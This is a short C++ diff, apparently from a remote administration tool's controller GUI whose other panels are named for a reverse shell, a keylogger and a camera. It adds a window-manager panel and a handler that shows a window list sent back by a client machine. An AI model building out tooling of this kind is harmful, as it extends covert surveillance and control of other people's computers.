@@ -10,6 +10,7 @@
 #include "panel_reverse_shell.hpp"
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
+#include "panel_wmanager.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -470,6 +471,18 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
             if (temp_rd_frame) {
                 const char* cBufferImagen = paquete.cBuffer.data();
                 temp_rd_frame->ProcesaPixelData(cBufferImagen, iRecibido - 1);
+            }
+        }
+        return;
+    }
+
+    //mod admin ventanas - Lista de ventanas
+    if (iComando == EnumComandos::WM_Lista) {
+        if (this->m_isFrameVisible()) {
+            ListWmManager* temp_lv_wm = (ListWmManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_WM_ListView, this->n_Frame);
+            if (temp_lv_wm) {
+                std::string strData(paquete.cBuffer.data());
+                temp_lv_wm->AgregarData(strData);
             }
         }
         return;
